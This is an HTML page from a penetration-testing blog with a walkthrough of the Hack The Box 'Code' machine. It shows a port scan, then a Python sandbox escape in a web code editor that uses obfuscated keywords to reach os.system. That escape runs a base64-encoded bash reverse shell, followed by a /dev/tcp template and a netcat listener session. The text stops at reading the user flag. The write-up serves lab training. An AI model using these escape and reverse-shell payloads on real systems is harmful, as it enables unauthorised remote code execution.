<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="HTB Code" />
<meta property="og:locale" content="en" />
<meta name="description" content="OS: üêß Linux Difficulty: Easy Points: 20 Author: FisMatHack" />
<meta property="og:description" content="OS: üêß Linux Difficulty: Easy Points: 20 Author: FisMatHack" />
<link rel="canonical" href="http://0.0.0.0:4000/posts/HTB_code/" />
<meta property="og:url" content="http://0.0.0.0:4000/posts/HTB_code/" />
<meta property="og:site_name" content="k1tch0p‚Äôs Blog" />
<meta property="og:image" content="http://0.0.0.0:4000/assets/img/posts/code/HTB_code_cover.png" />
<meta property="og:image:height" content="200px" />
<meta property="og:image:width" content="300px" />
<meta property="og:image:alt" content="HTB Code Preview" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-03T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://0.0.0.0:4000/assets/img/posts/code/HTB_code_cover.png" />
<meta name="twitter:image:alt" content="HTB Code Preview" />
<meta property="twitter:title" content="HTB Code" />
<meta name="twitter:site" content="@nassim_ned" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-08-16T09:34:26+00:00","datePublished":"2025-08-03T00:00:00+00:00","description":"OS: üêß Linux Difficulty: Easy Points: 20 Author: FisMatHack","headline":"HTB Code","image":{"alt":"HTB Code Preview","width":"300px","height":"200px","class":"right","url":"http://0.0.0.0:4000/assets/img/posts/code/HTB_code_cover.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/HTB_code/"},"url":"http://0.0.0.0:4000/posts/HTB_code/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HTB Code | k1tch0p's Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="k1tch0p's Blog">
<meta name="application-name" content="k1tch0p's Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/profile_picture.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">k1tch0p's Blog</a>
    <p class="site-subtitle fst-italic mb-0">Penetration Tester | Ethical hacker</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/k1tch0p"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['jn_nedjar','esi.dz'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/nassim-nedjar-78ab83207/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>HTB Code</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>HTB Code</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1754179200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug  3, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1755336866"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 16, 2025
</time>

        </span>
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/posts/code/HTB_code_cover.png" class="popup img-link preview-img shimmer"><img src="/assets/img/posts/code/HTB_code_cover.png"  alt="HTB Code Preview" width="1200" height="630"  loading="lazy"></a><figcaption class="text-center pt-2 pb-2">HTB Code Preview</figcaption></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://www.linkedin.com/in/nassim-nedjar-78ab83207/">k1tch0p</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2006 words"
>
  <em>11 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">HTB Code</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">HTB Code</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <blockquote>
  <p><strong>OS:</strong> üêß Linux<br />
<strong>Difficulty:</strong> <span style="color:lightgreen; font-weight:600;">Easy</span><br />
<strong>Points:</strong> 20<br />
<strong>Author:</strong> FisMatHack</p>
</blockquote>

<p>Code starts by exploiting an RCE in a Python Code Editor web app by using a Python Jail Bypass. Once we have the foothold and after files inspection, we find a databas file with users creds, that we crack to move laterally. For the privesc, the user has permissions to a backup utility script, to be exploited via a path traversal vulnerabiliy, to backup <strong>root</strong> directory, consequently, we get root.</p>

<hr />

<h2 id="foothold"><span class="me-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>We start by a scan for open ports using Nmap:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>Nmap scan report for 10.10.11.62
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></td></tr></tbody></table></code></div></div>
<p>Beside the ssh running on port 22, we have a web app running on port 5000, so visit this web page :</p>

<p><a href="/assets/img/posts/code/homepage.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/homepage.png" alt="Code HTB Homepage" loading="lazy"></a>
<em>Website Homepage</em></p>

<p>So it‚Äôs basically an online python code editor, we write a python script, and execute it by clicking on ‚ÄúRun‚Äù, as described in /about :<br />
<a href="/assets/img/posts/code/about.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/about.png" alt="Code HTB About" loading="lazy"></a>
<em>Website About page</em></p>

<p>As there are two other pages, one for registering a new user account, the other to login with an already registered user account :</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th style="text-align: center"><a href="/assets/img/posts/code/register.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/register.png" alt="Code HTB Register page" loading="lazy"></a></th>
      <th style="text-align: center"><a href="/assets/img/posts/code/login.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/login.png" alt="Code HTB Login page" loading="lazy"></a></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>Register page</em></td>
      <td style="text-align: center"><em>Login page</em></td>
    </tr>
  </tbody>
</table></div>

<p>This mainly for saving the user‚Äôs scripts.
<a href="/assets/img/posts/code/save.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/save.png" alt="Code HTB Save" loading="lazy"></a>
<em>Website Save page</em></p>

<p>We use Burpsuite to intercept a code running request, then we just change the code each time, for better output (just make sure the indentation is respected, even though code may look like one block when URL encoded).</p>

<p>So we craft a payload to bypass this Python sandbox.</p>

<p>So we start by printing globals() output.</p>
<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(</span><span class="nf">globals</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></div></div>
<p>The <code class="language-plaintext highlighter-rouge">globals()</code> function in Python returns a dictionary representing the current global symbol table, showing all the names (variables, functions, classes, modules, ‚Ä¶) that are accessible in the current global scope.</p>

<p><a href="/assets/img/posts/code/globals.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/globals.png" alt="Code " loading="lazy"></a>
<em>globals</em></p>

<p>we notice that the module <code class="language-plaintext highlighter-rouge">os</code> is imported : 
<a href="/assets/img/posts/code/os.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/os.png" alt="Code " loading="lazy"></a>
<em>os module found</em></p>

<p>We list all classes that inherit from <code class="language-plaintext highlighter-rouge">object</code></p>
<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="k">for</span> <span class="n">cls</span> <span class="ow">in</span> <span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">end</span> <span class="o">=</span> <span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">)</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>Among these classes, we find the <code class="language-plaintext highlighter-rouge">BuiltinImporter</code> class :</p>

<p><a href="/assets/img/posts/code/builtin.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/builtin.png" alt="Code " loading="lazy"></a>
<em>BuiltinImporter class</em></p>

<p>Basically, <code class="language-plaintext highlighter-rouge">BuiltinImporter</code> is responsible for finding and loading built-in modules.</p>

<blockquote>
  <p><strong>Note:</strong> Import Steps for os module :</p>
  <ol>
    <li>Checks BuiltinImporter (not found)</li>
    <li>Checks sys.path via PathFinder</li>
    <li>Finds os.py in standard library</li>
    <li>During execution, os.py imports from built-in posix module</li>
  </ol>
</blockquote>

<p>We‚Äôll simply bypass the constraint by obfuscating the restricted keywords, by dynamically constructing them, by  concatenating the character translation of their numerical ASCII code :</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">for</span> <span class="n">cls</span> <span class="ow">in</span> <span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">():</span>
  <span class="k">if</span> <span class="n">cls</span><span class="p">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">66</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">114</span><span class="p">]]):</span>
  <span class="n">mod</span> <span class="o">=</span> <span class="nf">cls</span><span class="p">().</span><span class="nf">load_module</span><span class="p">(</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">111</span><span class="p">,</span> <span class="mi">115</span><span class="p">]))</span>  
  <span class="nf">getattr</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">115</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">]))(</span><span class="sh">'</span><span class="s">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMi80NDQ0IDA+JjE= | base64 -d | bash</span><span class="sh">'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>So we‚Äôll load the <code class="language-plaintext highlighter-rouge">os</code> module, and then we use <code class="language-plaintext highlighter-rouge">getattr()</code> to access <code class="language-plaintext highlighter-rouge">system</code> method, to execute arbitrary commands.</p>

<p><code class="language-plaintext highlighter-rouge">getattr()</code> is a built-in Python function that dynamically accesses an object‚Äôs attributes or methods by name (as a string).</p>

<p>So our exploit, is interpreted as :</p>
<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">for</span> <span class="n">cls</span> <span class="ow">in</span> <span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">():</span>
  <span class="k">if</span> <span class="n">cls</span><span class="p">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">BuiltinImporter</span><span class="sh">'</span><span class="p">:</span>
  <span class="n">mod</span> <span class="o">=</span> <span class="nf">cls</span><span class="p">().</span><span class="nf">load_module</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span>  
  <span class="nf">getattr</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">echo &lt;payload&gt; | base64 -d | bash</span><span class="sh">'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>For the payload, we can just use a regular reverse shell payload :</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;ip_address&gt;/&lt;port&gt; 0&gt;&amp;1
</pre></td></tr></tbody></table></code></div></div>

<p>We start a listener on port 4444, and we run our exploit : 
<a href="/assets/img/posts/code/rce.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/rce.png" alt="Code " loading="lazy"></a>
<em>Exploit request</em><br />
We receive a shell session as app-production!</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>‚ûú  Code rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.62 60540
bash: cannot set terminal process group (100765): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$ whoami
whoami
app-production
</pre></td></tr></tbody></table></code></div></div>
<p>We visit it‚Äôs home directory, and we find the user flag there :</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>app-production@code:~$ cat user.txt
cat user.txt
